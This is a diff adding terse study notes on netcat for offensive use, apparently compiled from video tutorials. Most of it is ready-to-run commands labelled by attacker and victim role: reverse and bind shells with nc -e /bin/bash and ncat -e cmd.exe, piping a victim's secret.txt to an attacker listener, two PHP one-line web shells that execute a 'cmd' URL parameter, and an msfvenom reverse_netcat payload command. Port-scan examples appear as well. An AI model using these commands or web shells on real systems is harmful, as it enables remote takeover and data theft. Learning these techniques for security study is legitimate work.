@@ -1,0 +1,91 @@
+nc:
+
+-l -> Listen
+-v -> Verbose
+-p -> port
+-w -> timeout
+-n -> donot resolve
+-c -> Executive commands
+-z -> Port Scan
+
+nc -zvw 1 127.0.0.1 1-100
+nc -zvnw 1 127.0.0.1 1-100
+echo "" | nc -vn 127.0.0.1 80
+echo "" | nc -vn 127.0.0.1 22
+
+Attacker[Listener] - Victim[Inisiator]  --> Reverse Shell
+Attacker[Inisiator] - Victim[Listener] --> Blind Shell
+
+Reverse Shell: Victim connects to the attacker (Initiator: Victim, Listener: Attacker).
+Blind Shell: Attacker connects to the victim and can execute commands without seeing direct output (Initiator: Attacker, Listener: Victim).
+
+Reverse Shell:
+Attacker Machine : nc -lvp 4040
+Victim Machine : nc -v 127.0.0.1 4040
+Victim Machine : nc -v 127.0.0.1 4040 -e /bin/bash
+
+Attacker Machine : nc -lvp 7777 > secret.txt
+Victim Machine : nc -vn 127.0.0.1 7777 < secret.txt
+
+Source : https://www.youtube.com/watch?v=Wzc9cgEar7g
+
+Blind Shell Vs Reverse Shell:
+
+Shell : <?php if(isset($_GET['cmd'])){echo "<pre>".shell_exec($_GET['cmd'])."</pre>";} ?>
+Shell : <?php system($_GET['cmd']); ?>
+Call : http://yourdomain.com/script.php?cmd=ls
+
+Blind Shell:
+nc -lvp 3333 -e /bin/bash    Attacker[Inisiator]
+nc -v 127.0.0.1 3333         Victim[Listener]
+
+Reverse Shell:
+nc -lvp 5555			Attacker[Listener]
+nc 127.0.0.1 5555 -e /bin/bash  Victim[Inisiator]
+
+Source : https://www.youtube.com/watch?v=PMd4mmRuua0
+
+Blind Shell: https://quickref.me/nc.html
+ip a
+python3 -m http.server
+
+nc -nlvp 4444    # (Kali Linux)
+nc 127.0.0.1 4444  # (Windows or Kali Linux)
+
+nc -nlvp 4444 > wget.exe   # (Windows - Receiving File)
+nc 127.0.0.1 4444 < wget.exe  # (Windows - Sending File)
+
+nc -nlvp 4444 -e /usr/bin/bash   # (Kali Linux)
+nc 127.0.0.1 4444   # (Windows - Attacker Machine)
+
+Tutorial : https://www.youtube.com/watch?v=Wzc9cgEar7g
+
+nc:
+
+nc -zv 127.0.0.1 10-500  [Normal Scan]
+nc -zvu 127.0.0.1 10-500 [UDP Scan]
+
+Chatting:
+nc -lvp 3333 [Attacker/kali]
+ncat.exe 127.0.0.1 3333 [Target/Windows]
+
+ncat.exe -lvp 4444 [windows/Attacker]
+nc 127.0.0.1 4444 [linux/Victim]
+
+cat > 1.txt
+nc -lvp 5555 < 1.txt    [victim]
+nc 192.168.1.1 > 1.txt  [Attacker]
+
+msfvenom -p /cmd/unix/reverse_netcat lhost=192.168.1.1 lport=6666 R
+
+ncat.exe 127.0.0.1 3333 -e cmd.exe [Windows]
+nc -lvp 3333 [Linux]
+
+sudo bash
+ncat -e /bin/sh -vlp 1200 [Linux]
+nc -vv 127.0.0.1 [Windows]
+
+Source : https://www.youtube.com/watch?v=o1tW0ohQoQM
+
+
+
